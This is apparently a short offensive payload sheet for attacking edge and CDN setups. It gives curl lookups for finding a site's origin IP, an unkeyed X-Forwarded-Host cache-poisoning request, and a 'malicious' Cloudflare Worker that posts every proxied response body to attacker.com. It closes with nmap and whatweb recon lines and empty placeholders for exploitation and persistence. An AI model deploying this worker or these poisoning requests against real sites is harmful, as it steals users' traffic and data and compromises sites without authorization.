# Payloads — edge-computing-security

> Attack payloads for edge-computing-security.

## Origin IP Discovery

### DNS History (SecurityTrails)

```bash
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" -H "APIKEY: YOUR_KEY"
```

### SSL Certificate SAN

```bash
# Search for certs matching target domain
curl "https://crt.sh/?q=target.com"
# Find IPs hosting those certs
```

## Cache Poisoning

### Unkeyed Header Poisoning

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

Server may cache response with attacker.com link.

## Cloudflare Workers Abuse

### Malicious Worker

```javascript
addEventListener('fetch', event => {
  event.respondWith(fetch(event.request).then(response => {
    // Exfiltrate response to attacker
    fetch('https://attacker.com/log', {method: 'POST', body: response.clone().body});
    return response;
  }));
});
```


---

## Additional Payloads

### Reconnaissance

```bash
# Fingerprint target
nmap -sV target.com
whatweb target.com
```

### Exploitation

```bash
# Various exploitation payloads
# (See kali-claw for full library)
```

### Persistence

```bash
# Persistence techniques
# (Depends on specific target)
```
